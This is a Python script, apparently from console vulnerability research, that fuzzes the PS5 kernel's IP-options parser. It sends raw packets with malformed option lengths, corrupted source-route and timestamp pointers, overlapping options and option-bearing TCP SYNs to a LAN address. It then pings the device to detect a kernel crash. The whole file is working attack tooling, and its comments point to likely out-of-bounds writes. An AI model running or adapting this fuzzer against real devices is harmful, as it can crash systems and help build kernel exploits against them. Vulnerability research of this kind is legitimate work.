#!/usr/bin/env python3
"""
IP Options input-side fuzzer targeting PS5 kernel ip_dooptions().

Sends crafted IP packets with malformed options directly to the PS5's
LAN IP. The input-side parser (ip_dooptions called from ip_input) does
NOT have the same validation as the output-side (ip_output), so
malformed option lengths, nested LSRR, and truncated options reach
deeper kernel code.

This does NOT require port 9026 — just network reachability.
Requires root/sudo for raw sockets.

Usage: sudo python3 tools/ip_options_fuzz.py [--ps5-ip 10.0.0.96] [--check-alive]
"""

import argparse
import sys
import time
import subprocess

def check_alive(ip):
    """Check if PS5 responds to ping."""
    try:
        r = subprocess.run(["ping", "-c", "1", "-W", "2", ip],
                          capture_output=True, timeout=5)
        return r.returncode == 0
    except Exception:
        return False

def main():
    parser = argparse.ArgumentParser(description="IP options fuzzer for PS5 kernel")
    parser.add_argument("--ps5-ip", default="10.0.0.96")
    parser.add_argument("--check-alive", action="store_true",
                       help="Check PS5 reachability between batches")
    parser.add_argument("--batch", type=int, default=0,
                       help="Run specific batch (0=all)")
    args = parser.parse_args()

    try:
        from scapy.all import IP, ICMP, TCP, UDP, Raw, send, RandShort, conf
    except ImportError:
        print("ERROR: scapy not installed. pip3 install scapy")
        sys.exit(1)

    conf.verb = 0  # quiet
    target = args.ps5_ip
    sent = 0
    crashes = 0

    print(f"=== IP OPTIONS FUZZER ===")
    print(f"Target: {target}")
    print(f"Checking alive: {check_alive(target)}")
    print()

    # ============================================================
    # BATCH 1: Malformed option lengths
    # ip_dooptions reads opt_len from the option byte stream.
    # len=0 can cause infinite loop; len=1 means just the type byte;
    # len > remaining can read past buffer.
    # ============================================================
    if args.batch == 0 or args.batch == 1:
        print("--- BATCH 1: Malformed option lengths ---")
        variants = []

        # Option types: LSRR=131, SSRR=137, RR=7, TS=68, NOP=1, EOL=0
        for opt_type in [7, 68, 131, 137, 130, 136, 142]:
            # len=0 (infinite loop risk)
            variants.append(bytes([opt_type, 0]))
            # len=1 (just type, no data)
            variants.append(bytes([opt_type, 1]))
            # len=2 (minimal)
            variants.append(bytes([opt_type, 2, 4]))
            # len=3 with pointer
            variants.append(bytes([opt_type, 3, 4]))
            # len=255 (way past buffer)
            variants.append(bytes([opt_type, 255]) + b"\x04" + b"\x41" * 36)
            # len=40 (max IP options)
            variants.append(bytes([opt_type, 40, 4]) + b"\x00" * 37)

        for i, opt_bytes in enumerate(variants):
            # Pad to 4-byte alignment
            padded = opt_bytes + b"\x00" * (4 - len(opt_bytes) % 4) if len(opt_bytes) % 4 else opt_bytes
            if len(padded) > 40:
                padded = padded[:40]

            try:
                pkt = IP(dst=target, options=Raw(padded)) / ICMP()
                send(pkt)
                sent += 1
            except Exception as e:
                if i < 3:
                    print(f"  send error: {e}")

        print(f"  Sent {len(variants)} malformed length variants")

    # ============================================================
    # BATCH 2: LSRR/SSRR pointer corruption
    # The pointer field in source route options controls where
    # ip_dooptions writes the next hop. Corrupt pointer values
    # can write past the option buffer into IP header/payload.
    # ============================================================
    if args.batch == 0 or args.batch == 2:
        print("--- BATCH 2: Source route pointer corruption ---")
        count = 0

        for opt_type in [131, 137]:  # LSRR, SSRR
            for ptr in [0, 1, 2, 3, 5, 8, 36, 40, 100, 255]:
                for length in [7, 11, 15, 39]:
                    data = bytes([opt_type, length, ptr]) + b"\x0A\x00\x00\x01" * ((length - 3) // 4)
                    data = data[:length]
                    padded = data + b"\x00" * (4 - len(data) % 4) if len(data) % 4 else data
                    if len(padded) > 40:
                        padded = padded[:40]
                    try:
                        pkt = IP(dst=target, options=Raw(padded)) / ICMP()
                        send(pkt)
                        sent += 1
                        count += 1
                    except Exception:
                        pass

        print(f"  Sent {count} source route pointer variants")

    # ============================================================
    # BATCH 3: Timestamp option corruption
    # Type=68. Has pointer + overflow/flag fields.
    # oflw_flg byte: upper 4 bits = overflow count, lower 4 = flag
    # flag=1: timestamps only; flag=3: IP+timestamp pairs
    # Corrupt pointer/overflow can write past buffer.
    # ============================================================
    if args.batch == 0 or args.batch == 3:
        print("--- BATCH 3: Timestamp option corruption ---")
        count = 0

        for flag in [0, 1, 2, 3, 0xF]:
            for overflow in [0, 1, 0xF]:
                oflw_flg = (overflow << 4) | flag
                for ptr in [1, 5, 9, 37, 40, 100, 255]:
                    for length in [4, 8, 12, 36, 40]:
                        data = bytes([68, length, ptr, oflw_flg]) + b"\x00" * (length - 4)
                        padded = data + b"\x00" * (4 - len(data) % 4) if len(data) % 4 else data
                        if len(padded) > 40:
                            padded = padded[:40]
                        try:
                            pkt = IP(dst=target, options=Raw(padded)) / ICMP()
                            send(pkt)
                            sent += 1
                            count += 1
                        except Exception:
                            pass

        print(f"  Sent {count} timestamp variants")

    # ============================================================
    # BATCH 4: Nested/overlapping options
    # Multiple options in one header that conflict or overlap.
    # Two LSRR options, LSRR+SSRR combo, etc.
    # ============================================================
    if args.batch == 0 or args.batch == 4:
        print("--- BATCH 4: Nested/overlapping options ---")
        count = 0

        combos = [
            # Two LSRR
            bytes([131, 7, 4, 10, 0, 0, 1, 131, 7, 4, 10, 0, 0, 2]) + b"\x00" * 2,
            # LSRR + SSRR
            bytes([131, 7, 4, 10, 0, 0, 1, 137, 7, 4, 10, 0, 0, 2]) + b"\x00" * 2,
            # RR + LSRR
            bytes([7, 7, 4, 0, 0, 0, 0, 131, 7, 4, 10, 0, 0, 1]) + b"\x00" * 2,
            # TS + LSRR
            bytes([68, 8, 5, 1, 0, 0, 0, 0, 131, 7, 4, 10, 0, 0, 1]) + b"\x00",
            # Multiple NOP + truncated option
            bytes([1, 1, 1, 1, 131, 3, 40]) + b"\x00",
            # EOL in middle, then option after
            bytes([0, 131, 7, 4, 10, 0, 0, 1]),
            # All NOPs (40 bytes)
            bytes([1] * 40),
            # Option with len pointing past EOL
            bytes([131, 39, 4]) + b"\x0A\x00\x00\x01" * 9,
        ]

        for combo in combos:
            padded = combo + b"\x00" * (4 - len(combo) % 4) if len(combo) % 4 else combo
            if len(padded) > 40:
                padded = padded[:40]
            try:
                pkt = IP(dst=target, options=Raw(padded)) / ICMP()
                send(pkt)
                sent += 1
                count += 1
            except Exception:
                pass

        print(f"  Sent {count} nested option variants")

    # ============================================================
    # BATCH 5: Options on TCP SYN (different code path)
    # ip_dooptions processes options regardless of L4 protocol,
    # but TCP SYN packets hit additional code in tcp_input.
    # ============================================================
    if args.batch == 0 or args.batch == 5:
        print("--- BATCH 5: Options on TCP SYN ---")
        count = 0

        dangerous_opts = [
            bytes([131, 7, 4, 10, 0, 0, 1]) + b"\x00",   # LSRR
            bytes([137, 7, 4, 10, 0, 0, 1]) + b"\x00",   # SSRR
            bytes([7, 7, 4, 0, 0, 0, 0]) + b"\x00",      # RR
            bytes([68, 8, 5, 1, 0, 0, 0, 0]),             # TS
            bytes([131, 0]) + b"\x00" * 2,                  # LSRR len=0
            bytes([131, 255, 4]) + b"\x41" * 37,           # LSRR len=255
        ]

        for port in [9026, 80, 443, 1234]:
            for opt_bytes in dangerous_opts:
                padded = opt_bytes + b"\x00" * (4 - len(opt_bytes) % 4) if len(opt_bytes) % 4 else opt_bytes
                if len(padded) > 40:
                    padded = padded[:40]
                try:
                    pkt = IP(dst=target, options=Raw(padded)) / TCP(dport=port, flags="S", sport=RandShort())
                    send(pkt)
                    sent += 1
                    count += 1
                except Exception:
                    pass

        print(f"  Sent {count} TCP SYN with options variants")

    # Check if PS5 is still alive
    print()
    alive = check_alive(target)
    print(f"Total packets sent: {sent}")
    print(f"PS5 still alive: {alive}")
    if not alive:
        print("*** PS5 STOPPED RESPONDING — POSSIBLE KERNEL CRASH ***")
        crashes += 1

    print(f"\n=== FUZZER COMPLETE: {sent} packets, {crashes} crashes ===")

if __name__ == "__main__":
    main()
